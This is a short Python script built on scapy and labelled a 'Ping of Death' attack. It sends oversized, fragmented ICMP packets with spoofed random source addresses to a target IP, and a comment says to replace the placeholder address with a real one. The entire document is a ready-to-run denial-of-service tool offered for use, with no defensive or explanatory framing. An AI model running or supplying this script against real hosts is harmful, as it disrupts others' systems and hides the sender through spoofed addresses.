
```python
from scapy.all import IP, ICMP, fragment, send
from scapy.volatile import RandIP

# Target IP
target_ip = "192.10.1.1" #replace with target ip

# Ping of Death attack function
def ping_of_death(target_ip):
    # Create a large ICMP packet
    payload = "X" * 50000  # Oversized payload
    packet = IP(src=RandIP(), dst=target_ip) / ICMP() / payload
    # Fragment the packet
    fragments = fragment(packet, fragsize=1400)
    # Send the fragments
    for frag in fragments:
        send(frag, verbose=0)

# Start the Ping of Death attack
ping_of_death(target_ip)
